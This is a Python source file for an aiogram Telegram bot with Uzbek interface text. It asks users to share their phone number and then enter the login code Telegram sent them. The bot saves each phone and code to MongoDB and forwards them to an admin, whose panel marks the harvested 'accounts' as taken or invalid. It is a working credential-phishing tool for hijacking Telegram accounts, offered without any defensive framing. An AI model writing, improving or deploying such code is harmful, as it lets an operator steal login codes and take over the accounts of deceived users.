import asyncio
from datetime import datetime

from aiogram import Bot, Dispatcher, F
from aiogram.types import (
    Message,
    CallbackQuery,
    ReplyKeyboardMarkup,
    KeyboardButton,
    InlineKeyboardMarkup,
    InlineKeyboardButton
)
from aiogram.filters import Command
from aiogram.enums import ParseMode

from motor.motor_asyncio import AsyncIOMotorClient
from bson import ObjectId
import os

# ===== CONFIG =====
BOT_TOKEN = os.getenv("BOT_TOKEN")
MONGO_URI = os.getenv("MONGO_URI")
ADMIN_ID = int(os.getenv("8436036450"))

bot = Bot(token=BOT_TOKEN, parse_mode=ParseMode.HTML)
dp = Dispatcher()

mongo = AsyncIOMotorClient(MONGO_URI)
db = mongo["acc_bot"]
accs = db["accounts"]

# ===== KEYBOARDS =====

def contact_kb():
    return ReplyKeyboardMarkup(
        keyboard=[
            [KeyboardButton(text="Kontakt yuborish", request_contact=True)]
        ],
        resize_keyboard=True,
        one_time_keyboard=True
    )

def admin_main_kb():
    return InlineKeyboardMarkup(
        inline_keyboard=[
            [InlineKeyboardButton(text="📥 Yangi akklar", callback_data="admin_new")],
            [InlineKeyboardButton(text="📋 Barcha akklar", callback_data="admin_all")]
        ]
    )

def acc_actions_kb(acc_id):
    return InlineKeyboardMarkup(
        inline_keyboard=[
            [InlineKeyboardButton(text="✔️ Olingan", callback_data=f"acc_taken:{acc_id}")],
            [InlineKeyboardButton(text="❌ Yaroqsiz", callback_data=f"acc_bad:{acc_id}")],
            [InlineKeyboardButton(text="🗑 O‘chirish", callback_data=f"acc_del:{acc_id}")]
        ]
    )

# ===== STATES =====
user_states = {}  # user_id -> {"waiting_code": bool, "phone": str}


# ===== HANDLERS =====

@dp.message(Command("start"))
async def start_cmd(message: Message):
    user_states[message.from_user.id] = {"waiting_code": False, "phone": None}

    await message.answer(
        "O‘z kontaktingizni yuboring “Kontakt yuborish” tugmasi orqali.",
        reply_markup=contact_kb()
    )


@dp.message(F.contact)
async def contact_handler(message: Message):
    user_id = message.from_user.id
    phone = message.contact.phone_number

    # saqlaymiz
    user_states[user_id]["phone"] = phone
    user_states[user_id]["waiting_code"] = True

    # xabarni o‘chirib tashlash (foydalanuvchi raqamni ko‘rmasligi uchun)
    try:
        await message.delete()
    except:
        pass

    await message.answer(
        "Raqam qabul qilindi.\n\nEndi sizga Telegram yuborgan kodni kiriting.",
        reply_markup=None
    )


@dp.message(F.text)
async def code_handler(message: Message):
    user_id = message.from_user.id

    if user_id not in user_states:
        return

    if not user_states[user_id]["waiting_code"]:
        return

    code = message.text.strip()
    phone = user_states[user_id]["phone"]

    if not phone:
        await message.answer("Raqam topilmadi. /start dan qayta boshlang.")
        return

    doc = {
        "user_id": user_id,
        "first_name": message.from_user.first_name,
        "username": message.from_user.username,
        "phone": phone,
        "code": code,
        "time": datetime.utcnow(),
        "status": "new"
    }

    res = await accs.insert_one(doc)

    # state reset
    user_states[user_id] = {"waiting_code": False, "phone": None}

    await message.answer("Kod qabul qilindi. Admin tekshiradi.")

    # adminni xabardor qilish
    try:
        await bot.send_message(
            ADMIN_ID,
            f"Yangi akk keldi:\n\n"
            f"ID: <code>{user_id}</code>\n"
            f"Raqam: <code>{phone}</code>\n"
            f"Kod: <code>{code}</code>\n"
            f"MongoID: <code>{res.inserted_id}</code>"
        )
    except:
        pass


# ===== ADMIN =====

@dp.message(Command("admin"))
async def admin_cmd(message: Message):
    if message.from_user.id != ADMIN_ID:
        return
    await message.answer("Admin panel:", reply_markup=admin_main_kb())


@dp.callback_query(F.data == "admin_new")
async def admin_new(callback: CallbackQuery):
    if callback.from_user.id != ADMIN_ID:
        return

    docs = await accs.find({"status": "new"}).sort("time", -1).to_list(50)

    if not docs:
        await callback.message.edit_text("Yangi akklar yo‘q.", reply_markup=admin_main_kb())
        return

    text = ""
    for d in docs:
        text += (
            f"<b>ID:</b> <code>{d['_id']}</code>\n"
            f"<b>User:</b> <code>{d['user_id']}</code>\n"
            f"<b>Raqam:</b> <code>{d['phone']}</code>\n"
            f"<b>Kod:</b> <code>{d['code']}</code>\n"
            f"<b>Status:</b> {d['status']}\n"
            f"---\n"
        )

    await callback.message.edit_text(text, reply_markup=admin_main_kb())


@dp.callback_query(F.data == "admin_all")
async def admin_all(callback: CallbackQuery):
    if callback.from_user.id != ADMIN_ID:
        return

    docs = await accs.find({}).sort("time", -1).to_list(50)

    if not docs:
        await callback.message.edit_text("Akklar yo‘q.", reply_markup=admin_main_kb())
        return

    text = ""
    for d in docs:
        text += (
            f"<b>ID:</b> <code>{d['_id']}</code>\n"
            f"<b>User:</b> <code>{d['user_id']}</code>\n"
            f"<b>Raqam:</b> <code>{d['phone']}</code>\n"
            f"<b>Kod:</b> <code>{d['code']}</code>\n"
            f"<b>Status:</b> {d['status']}\n"
            f"---\n"
        )

    await callback.message.edit_text(text, reply_markup=admin_main_kb())


@dp.callback_query(F.data.startswith("acc_taken:"))
async def acc_taken(callback: CallbackQuery):
    if callback.from_user.id != ADMIN_ID:
        return

    acc_id = callback.data.split(":")[1]
    await accs.update_one({"_id": ObjectId(acc_id)}, {"$set": {"status": "taken"}})
    await callback.answer("Olingan deb belgilandi.")


@dp.callback_query(F.data.startswith("acc_bad:"))
async def acc_bad(callback: CallbackQuery):
    if callback.from_user.id != ADMIN_ID:
        return

    acc_id = callback.data.split(":")[1]
    await accs.update_one({"_id": ObjectId(acc_id)}, {"$set": {"status": "bad"}})
    await callback.answer("Yaroqsiz deb belgilandi.")


@dp.callback_query(F.data.startswith("acc_del:"))
async def acc_del(callback: CallbackQuery):
    if callback.from_user.id != ADMIN_ID:
        return

    acc_id = callback.data.split(":")[1]
    await accs.delete_one({"_id": ObjectId(acc_id)})
    await callback.answer("O‘chirildi.")


# ===== RUN =====

async def main():
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
